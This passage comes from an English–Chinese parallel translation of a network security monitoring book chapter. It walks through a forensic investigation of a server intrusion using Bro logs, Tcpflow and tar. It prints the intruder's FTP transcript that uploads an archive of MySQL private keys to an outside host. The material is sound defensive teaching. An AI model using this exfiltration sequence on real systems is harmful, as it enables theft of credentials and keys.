  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: remote_location.country_code remote_location.region remote_location.city
- en: remote_location.latitude remote_location.longitude
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: remote_location.latitude remote_location.longitude
- en: '#types time string addr port addr port string enum string'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: '#types time string addr port addr port string enum string'
- en: string count string string string double double
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: string count string string string double double
- en: 1362880870.544761 8zAB2nsjjYd 203.0.113.77 65438
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 1362880870.544761 8zAB2nsjjYd 203.0.113.77 65438
- en: 192.168.3.5 22 success INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5 22 成功 INBOUND SSH-2.0-OpenSSH_5.8p2_hpn13v11
- en: FreeBSD-20110503u SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1v 16678 AU
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: FreeBSD-20110503u SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1v 16678 AU
- en: '- - - -'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: '- - - -'
- en: '#close 2013-03-10-03-00-00'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: '#close 2013-03-10-03-00-00'
- en: '*Listing 10-15: SSH connection logged by Bro, with headers*'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 10-15：由 Bro 记录的 SSH 连接，带有头部信息*'
- en: The client and server fields are the most interesting. The client is listed
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端和服务器字段最为有趣。客户端列出
- en: as SSH-2.0-OpenSSH_5.8p2_hpn13v11 FreeBSD-20110503 u, and the server is
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 作为 SSH-2.0-OpenSSH_5.8p2_hpn13v11 FreeBSD-20110503 u，服务器是
- en: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 v. While you can easily identify the
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 v。虽然你可以轻松识别出
- en: server version of SSH because you own the system, the information that the
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: SSH 的服务器版本，因为你拥有该系统，系统提供的信息
- en: client (the intruder) runs FreeBSD may be interesting. Knowing the exact
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端（入侵者）运行 FreeBSD，可能是有趣的。知道确切的
- en: version of OpenSSH on the client (again, the intruder) may also help you to
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端的 OpenSSH 版本（再次，入侵者）也可能帮助你
- en: attribute the attack or to correlate it with other incident data.
  id: totrans-196
  prefs: []
  type: TYPE_NORMAL
  zh: 将攻击归因或将其与其他事件数据关联。
- en: Unfortunately, the contents of the SSH session are encrypted, meaning
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 不幸的是，SSH 会话的内容是加密的，意味着
- en: that you can’t decipher them using network-centric means. If the system
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 你不能通过网络中心手段解密它们。如果系统
- en: had a host-centric tool like OSSEC installed, you might have had data avail-
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 如果安装了类似 OSSEC 的主机中心工具，可能已经有数据可用-
- en: able from the local system for inspection, but the session records show the
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 可以从本地系统进行检查，但会话记录显示了
- en: SSH session beginning at 2013-03-10 02:01:10 and terminating at 02:03:24\.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 2013-03-10 02:01:10 开始的 SSH 会话并在 02:03:24 终止\。
- en: Can we tell what the intruder did in this encrypted session? The last few ses-
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 我们能否通过这个加密会话知道入侵者做了什么？最后几个会话-
- en: sion records help answer that question.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 会话记录有助于回答这个问题。
- en: Server-side Compromise **227**
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端的妥协 **227**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Searching Bro FTP Logs***'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: '***搜索 Bro FTP 日志***'
- en: At 2013-03-10 02:02:50 in Figure 10-11, we see an outbound FTP session
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 在 2013-03-10 02:02:50 的图 10-11 中，我们看到一个出站的 FTP 会话
- en: from 192.168.3.5 to 203.0.113.4\. If this is truly an FTP session, we should
    be
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 从 192.168.3.5 到 203.0.113.4。如果这确实是一个 FTP 会话，我们应该是
- en: able to build a transcript to see the contents. We can also quickly check the
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 可以构建转录以查看内容。我们还可以快速检查
- en: Bro FTP log, as shown in Listing 10-16\.
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: Bro FTP 日志，如清单 10-16 所示\。
- en: $ **zcat ftp.02\:03\:11-03\:00\:00.log.gz**
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: $ **zcat ftp.02\:03\:11-03\:00\:00.log.gz**
- en: '#separator \x09'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: '#separator \x09'
- en: '#set_separator ,'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: '#set_separator ,'
- en: '#empty_field (empty)'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: '#empty_field（空）'
- en: '#unset_field -'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: '#unset_field -'
- en: '#path ftpv'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: '#path ftpv'
- en: '#open 2013-03-10-02-03-11'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: '#open 2013-03-10-02-03-11'
- en: '#fields ts uid id.orig_h id.orig_p id.resp_h'
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: '#fields ts uid id.orig_h id.orig_p id.resp_h'
- en: id.resp_p user password command arg mime_type mime_
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: id.resp_p 用户 密码 命令 参数 mime_type mime_
- en: desc file_size reply_code reply_msg tags
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 描述 文件大小 回复代码 回复消息 标签
- en: extraction_file
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: extraction_file
- en: '#types time string addr port addr port string string string'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: '#types 时间 字符串 地址 端口 地址 端口 字符串 字符串 字符串'
- en: string string string count count string table[string] file
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 字符串 字符串 字符串 数量 数量 字符串 表格[字符串] 文件
- en: 1362880986.113638 FVmgKldpQO5 192.168.3.5w 32904
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 1362880986.113638 FVmgKldpQO5 192.168.3.5w 32904
- en: 203.0.113.4x 21 orr <hidden> STOR ftp://203.0.113.4/./
  id: totrans-225
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.4x 21 orr <隐藏> STOR ftp://203.0.113.4/./
- en: mysql-ssl.tar.gzu application/x-gzip gzip compressed data, from
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl.tar.gzu application/x-gzip gzip 压缩数据，来自
- en: FAT filesystem (MS-DOS, OS/2, NT) - 226 Transfer complete.
  id: totrans-227
  prefs: []
  type: TYPE_NORMAL
  zh: FAT 文件系统（MS-DOS、OS/2、NT） - 226 传输完成。
- en: '- -'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: '- -'
- en: '#close 2013-03-10-03-00-00'
  id: totrans-229
  prefs: []
  type: TYPE_NORMAL
  zh: '#close 2013-03-10-03-00-00'
- en: '*Listing 10-16: Bro FTP log*'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 10-16：Bro FTP 日志*'
- en: Here, we see that someone successfully transferred a file titled
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们看到有人成功地传输了一个名为的文件
- en: '*mysql-ssl.tar.gz* u via FTP v from 192.168.3.5 w to 203.0.113.4 x. The'
  id: totrans-232
  prefs: []
  type: TYPE_NORMAL
  zh: '*mysql-ssl.tar.gz* 通过 FTP 从 192.168.3.5 传输到 203.0.113.4。该'
- en: transcript shows a little more information, as shown in Listing 10-17\.
  id: totrans-233
  prefs: []
  type: TYPE_NORMAL
  zh: 转录显示了更多的信息，如清单 10-17 所示\。
- en: 'Sensor Name: sovm-eth1'
  id: totrans-234
  prefs: []
  type: TYPE_NORMAL
  zh: 传感器名称：sovm-eth1
- en: 'Timestamp: 2013-03-10 02:02:50'
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 时间戳：2013-03-10 02:02:50
- en: 'Connection ID: .sovm-eth1_1362880970000002980'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 连接 ID：.sovm-eth1_1362880970000002980
- en: 'Src IP: 192.168.3.5 (Unknown)'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 源 IP：192.168.3.5（未知）
- en: 'Dst IP: 203.0.113.4 (Unknown)'
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 目标 IP：203.0.113.4（未知）
- en: 'Src Port: 32904'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 源端口：32904
- en: 'Dst Port: 21'
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 目标端口：21
- en: 'OS Fingerprint: 192.168.3.5:32904 - Linux 2.6 (newer, 1) (up: 5 hrs)'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 操作系统指纹：192.168.3.5:32904 - Linux 2.6（更新版，1）（在线时长：5小时）
- en: 'OS Fingerprint: -> 203.0.113.4:21 (distance 0, link: ethernet/modem)'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 操作系统指纹：-> 203.0.113.4:21（距离 0，链路：以太网/调制解调器）
- en: 'DST: 220 freebsdvmw FTP server (Version 6.00LS) ready.'
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 目标：220 freebsdvmw FTP 服务器（版本 6.00LS）准备就绪。
- en: 'DST:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 目标：
- en: 'SRC: USER orrv'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 源：用户 orrv
- en: 'SRC:'
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 331 Password required for orr.'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：331 需要密码才能进入 orr。
- en: 'DST:'
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: PASS bobbyu'
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 源：PASS bobbyu
- en: '**228** Chapter 10'
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: '**228** 第10章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'SRC:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 230 User orr logged in.'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：230 用户 orr 登录。
- en: 'DST:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: SYST'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 源：SYST
- en: 'SRC:'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 215 UNIX Type: L8 Version: BSD-199506x'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：215 UNIX 类型：L8 版本：BSD-199506x
- en: 'DST:'
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: TYPE I'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 源：TYPE I
- en: 'SRC:'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 200 Type set to I.'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：200 类型设置为 I。
- en: 'DST:'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: PORT 192,168,3,5,128,244'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 源：PORT 192,168,3,5,128,244
- en: 'SRC:'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 200 PORT command successful.'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：200 PORT 命令成功。
- en: 'DST:'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: STOR mysql-ssl.tar.gz'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 源：STOR mysql-ssl.tar.gz
- en: 'SRC:'
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 150 Opening BINARY mode data connection for ''mysql-ssl.tar.gz''.'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：150 打开二进制模式数据连接用于 'mysql-ssl.tar.gz'。
- en: 'DST:'
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: '*Listing 10-17: Transcript of intruder FTP command channel to 203.0.113.4*'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-17：入侵者到 203.0.113.4 的 FTP 命令通道转录*'
- en: I like this guy. His password is bobby u, and his username is orr v. This
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: 我喜欢这个人。他的密码是 bobby u，用户名是 orr v。这个
- en: FTP server is running on a system that identifies itself as freebsdvm w, with
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: FTP 服务器运行在标识为 freebsdvm w 的系统上，
- en: 'UNIX Type L8 Version: BSD-199506 x. Again, we could use this information to'
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: UNIX 类型 L8 版本：BSD-199506 x。我们可以使用这些信息来
- en: possibly link this case with others, if appropriate.
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 如果适当，可能将此案件与其他案件关联。
- en: We don’t know what the intruder did to acquire the contents of this file.
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 我们不知道入侵者是如何获取此文件内容的。
- en: Can we determine what’s in it?
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 我们能确定里面有什么吗？
- en: '***Decoding the Theft of Sensitive Data***'
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: '***解码敏感数据的盗窃***'
- en: In fact, we can retrieve the *mysql-ssl.tar.gz* archive by virtue of the full
    content data collection performed by our NSM platform. We’ll derive extracted
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 事实上，我们可以通过我们 NSM 平台进行的完整内容数据收集来检索 *mysql-ssl.tar.gz* 压缩包。我们将派生提取
- en: content data from full content data using the tool that Sguil uses to rebuild
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 Sguil 工具重建的内容数据来自完整内容数据
- en: transcripts, called Tcpflow ( *https://github.com/simsong/tcpflow*). Jeremy
    Elson wrote the first version of Tcpflow, but in recent years Simson Garfinkel
    has
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 转录文件，称为 Tcpflow（*https://github.com/simsong/tcpflow*）。Jeremy Elson 编写了 Tcpflow
    的第一个版本，但近年来，Simson Garfinkel 接管了该项目。
- en: assumed responsibility for the project.
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 承担了该项目的责任。
- en: Tcpflow reconstructs TCP sessions. For example, in Listing 10-18, we
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: Tcpflow 重建 TCP 会话。例如，在列表 10-18 中，我们
- en: tell Tcpflow to rebuild all TCP sessions involving port 20, the TCP port used
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 告诉 Tcpflow 重建所有涉及端口 20 的 TCP 会话，这是用于
- en: for the active FTP data channel shown in the session records.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 用于会话记录中显示的活动 FTP 数据通道。
- en: $ **tcpflow -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-10/snort.log.1362873602
    port 20**u $ **ls**v
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: $ **tcpflow -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-10/snort.log.1362873602
    port 20**u $ **ls**v
- en: 192.168.003.005.33012-203.000.113.004.00020w 203.000.113.004.00020-192.168.003.005.56377x
    report.xmly
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.003.005.33012-203.000.113.004.00020w 203.000.113.004.00020-192.168.003.005.56377x
    report.xmly
- en: $ **file ***z
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: $ **file ***z
- en: '192.168.003.005.33012-203.000.113.004.00020{: gzip compressed data, from Unix,
    last modified: Sun Mar 10 02:02:23 2013'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: '192.168.003.005.33012-203.000.113.004.00020{: gzip 压缩数据，来自 Unix，最后修改时间：2013年3月10日
    02:02:23'
- en: '203.000.113.004.00020-192.168.003.005.56377|: ASCII text, with CRLF line terminators'
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: '203.000.113.004.00020-192.168.003.005.56377|: ASCII 文本，带 CRLF 行终止符'
- en: 'report.xml: XML document text'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: report.xml：XML 文档文本
- en: Server-side Compromise **229**
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端妥协 **229**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: $ **cat 203.000.113.004.00020-192.168.003.005.56377**
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: $ **cat 203.000.113.004.00020-192.168.003.005.56377**
- en: total 1936
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 总计 1936
- en: drwxr-xr-x 2 orr orr 512 Mar 9 21:03 .
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: drwxr-xr-x 2 orr orr 512 Mar 9 21:03 .
- en: drwxr-xr-x 4 root wheel 512 Mar 9 20:47 ..
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: drwxr-xr-x 4 root wheel 512 Mar 9 20:47 ..
- en: -rw-r--r-- 1 orr orr 1016 Mar 9 20:47 .cshrc
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 1016 Mar 9 20:47 .cshrc
- en: -rw-r--r-- 1 orr orr 254 Mar 9 20:47 .login
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 254 Mar 9 20:47 .login
- en: -rw-r--r-- 1 orr orr 165 Mar 9 20:47 .login_conf
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 165 Mar 9 20:47 .login_conf
- en: -rw------- 1 orr orr 381 Mar 9 20:47 .mail_aliases
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: -rw------- 1 orr orr 381 Mar 9 20:47 .mail_aliases
- en: -rw-r--r-- 1 orr orr 338 Mar 9 20:47 .mailrc
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 338 Mar 9 20:47 .mailrc
- en: -rw-r--r-- 1 orr orr 750 Mar 9 20:47 .profile
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 750 Mar 9 20:47 .profile
- en: -rw------- 1 orr orr 283 Mar 9 20:47 .rhosts
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: -rw------- 1 orr orr 283 Mar 9 20:47 .rhosts
- en: -rw-r--r-- 1 orr orr 980 Mar 9 20:47 .shrc
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 980 Mar 9 20:47 .shrc
- en: -rw-r--r-- 1 orr orr 915349 Mar 9 21:03 mysql-ssl.tar.gz}
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 915349 Mar 9 21:03 mysql-ssl.tar.gz}
- en: '*Listing 10-18: Tcpflow reconstruction of sessions involving port 20*'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-18：Tcpflow 重建涉及端口 20 的会话*'
- en: Listing 10-18 first shows how to run Tcpflow against an interesting trace,
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10-18 首先展示了如何针对有趣的跟踪记录运行 Tcpflow，
- en: with a BPF limiting reconstruction to traffic involving port 20 u. Next, we
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 BPF 限制重建只涉及端口 20 的流量 u。接下来，我们
- en: see the output of the Tcpflow reconstruction in the form of a directory list-
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 查看Tcpflow重建的输出，以目录列表的形式呈现
- en: ing v. The output shows two sides of the network session, in the form of two
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 输出显示了网络会话的两个方面，以两个
- en: files, w and x, and a *report.xml* file y describing what Tcpflow did. Next,
    we use the file z command to show the type of each of those files.
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 文件w和x，以及一个描述Tcpflow操作的*report.xml*文件y。接下来，我们使用file z命令来显示这些文件的类型。
- en: '***Extracting the Stolen Archive***'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: '***提取被窃取的归档***'
- en: The file *192.168.003.005.33012-203.000.113.004.00020* { is a *gzip* archive
    transferred during the FTP session. The file *203.000.113.004.00020-192*
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 文件*192.168.003.005.33012-203.000.113.004.00020* {是一个*gzip*归档文件，在FTP会话期间传输。文件*203.000.113.004.00020-192*
- en: '*.168.003.005.56377* | is an ASCII text file, corresponding to a directory
    listing returned from the FTP server to the client 192.168.3.5\. This directory'
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: '*.168.003.005.56377* | 是一个ASCII文本文件，对应于从FTP服务器返回到客户端192.168.3.5的目录列表。该目录'
- en: listing was transferred after the intruder copied *mysql-ssl.tar.gz* to the
    server.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 列表是在入侵者将*mysql-ssl.tar.gz*复制到服务器后传输的。
- en: This confirms the successful transfer of *mysql-ssl.tar.gz* }, because that
    file is now listed and stored on an FTP server controlled by the intruder. This
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 这确认了*mysql-ssl.tar.gz*的成功传输，因为该文件现在已列出并存储在由入侵者控制的FTP服务器上。这个
- en: could be bad news for Vivian’s Pets, if that file is a sensitive archive.
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 如果该文件是敏感的归档文件，这对Vivian’s Pets来说可能是坏消息。
- en: Thanks to capturing full content data, we also have a copy of *mysql-ssl*
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 多亏了捕获完整的内容数据，我们也拥有了*mysql-ssl*
- en: '*.tar.gz* at our disposal. The *gzip* archive represented by file *192.168.003.005*'
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: '*.tar.gz* 在我们手中。由文件*192.168.003.005*表示的*gzip*归档'
- en: '*.33012-203.000.113.004.00020* { is likely the *mysql-ssl.tar.gz* file stolen
    by the intruder. We extract it using the tar program, as shown in Listing 10-19\.
    As'
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: '*.33012-203.000.113.004.00020* {很可能是入侵者窃取的*mysql-ssl.tar.gz*文件。我们使用tar程序提取它，如列表10-19所示。'
- en: you can see, it appears to contain the keys associated with a MySQL server.
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，它似乎包含与MySQL服务器相关的密钥。
- en: $ **tar -xzvf 192.168.003.005.33012-203.000.113.004.00020**
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: $ **tar -xzvf 192.168.003.005.33012-203.000.113.004.00020**
- en: mysql-ssl/
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/
- en: mysql-ssl/yassl-1.9.8.zip
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/yassl-1.9.8.zip
- en: mysql-ssl/my.cnf
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/my.cnf
- en: mysql-ssl/mysqld.gdb
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysqld.gdb
- en: mysql-ssl/mysql-keys/
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/
- en: mysql-ssl/mysql-keys/server-cert.pem
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/server-cert.pem
- en: mysql-ssl/mysql-keys/ca-cert.pem
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/ca-cert.pem
- en: mysql-ssl/mysql-keys/client-req.pem
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/client-req.pem
- en: mysql-ssl/mysql-keys/server-key.pem
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/server-key.pem
- en: '**230** Chapter 10'
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: '**230** 第10章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: mysql-ssl/mysql-keys/server-req.pem
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/server-req.pem
- en: mysql-ssl/mysql-keys/client-key.pem
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/client-key.pem
- en: mysql-ssl/mysql-keys/client-cert.pem
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/client-cert.pem
- en: mysql-ssl/mysql-keys/ca-key.pem
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/ca-key.pem
- en: '*Listing 10-19: Contents of the* mysql-ssl .tar .gz *archive stolen by the
    intruder* With this data in hand, the Vivian’s Pets CIRT must summarize what'
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-19：入侵者窃取的* mysql-ssl .tar .gz *归档文件内容* 拥有这些数据后，Vivian’s Pets CIRT必须总结'
- en: has happened in order to fully understand the intrusion.
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: 了解发生了什么，以便全面理解入侵。
- en: '**Stepping back**'
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: '**回顾**'
- en: At this point in the NSM process, the CIRT should consider what it under-
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 在NSM过程中的这一阶段，CIRT应考虑它所
- en: stands about the intrusion before making recommendations to business
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: 在提供建议之前，理解入侵的背景对Vivian's Pets来说是非常重要的
- en: owners. Using illustrations to depict what has happened at each stage is a
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: 所有者。通过插图描述每个阶段发生的事情是一个
- en: helpful analytical step.
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: 有帮助的分析步骤。
- en: '***Summarizing Stage 1***'
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: '***总结第一阶段***'
- en: Figure 10-13 summarizes the first few phases of this intrusion, which we can
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-13总结了此次入侵的前几个阶段，我们可以
- en: call stage 1\.
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 第一阶段\。
- en: 1\. Intruder conducts reconnaissance against two potential victims.
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: 1\. 入侵者对两个潜在的受害者进行侦察。
- en: NETWORK SCANNING
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 网络扫描
- en: Victim 1
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 1
- en: Intruder 1
